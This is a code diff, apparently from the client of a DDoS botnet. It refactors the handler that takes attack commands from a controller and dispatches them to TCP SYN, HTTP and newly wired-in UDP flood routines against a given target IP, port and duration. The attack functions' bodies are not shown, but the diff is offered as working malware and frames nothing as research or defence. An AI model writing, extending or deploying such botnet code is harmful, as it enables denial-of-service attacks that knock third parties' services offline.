@@ -1,5 +1,5 @@
-#include <stdio.h>
 #include <math.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
@@ -12,14 +12,8 @@
 
 #define COMMANDS_NUM 6
 
-/* struct attack_t {
-    uint8_t type;
-    void (*execute)(char *target_ip, int target_port, int duration);
-};
-
-attack_t attacks[COMMANDS_NUM] = {
-    {ATTACK_TCP, atk_start_tcp_essyn}
-}; */
+#define BLUE_NURSE_PSIZE_DEFAULT 64
+#define BLUE_NURSE_FORKS_N_DEFAULT 16
 
 #ifdef DEBUG
 
@@ -92,24 +86,29 @@ static void parse_command(struct command *cmd)
         return;
     }
 
+    char *ip_string = ip_to_string(cmd->data.target.o1,
+                                   cmd->data.target.o2,
+                                   cmd->data.target.o3,
+                                   cmd->data.target.o4);
+
     switch (cmd->type)
     {
     case HELLO:
         break;
     case ATTACK_TCP:
-        atk_start_tcp_essyn(ip_to_string(cmd->data.target.o1,
-                                         cmd->data.target.o2,
-                                         cmd->data.target.o3,
-                                         cmd->data.target.o4),
+        atk_start_tcp_essyn(ip_string,
                             cmd->data.port, cmd->data.duration);
         break;
     case ATTACK_UDP:
+        /* In udp attack cmd->data.port is ignored
+            because the port is automatically detected by DoS script */
+        start_blue_nurse_flood(ip_string,
+                               (cmd->data.duration * 60),
+                               BLUE_NURSE_PSIZE_DEFAULT,
+                               BLUE_NURSE_FORKS_N_DEFAULT);
         break;
     case ATTACK_HTTP:
-        start_httplankton_attack(ip_to_string(cmd->data.target.o1,
-                                         cmd->data.target.o2,
-                                         cmd->data.target.o3,
-                                         cmd->data.target.o4), cmd->data.port, cmd->data.duration);
+        start_httplankton_attack(ip_string, cmd->data.port, cmd->data.duration);
         break;
     case PING:
         break;
@@ -117,7 +116,7 @@ static void parse_command(struct command *cmd)
         exit(0);
     default:
 #ifdef DEBUG
-        printf("Unknown command: 0x%02X\n", cmd->type);
+        printf("[command] Unknown command: 0x%02X\n", cmd->type);
 #endif
         exit(1);
     }
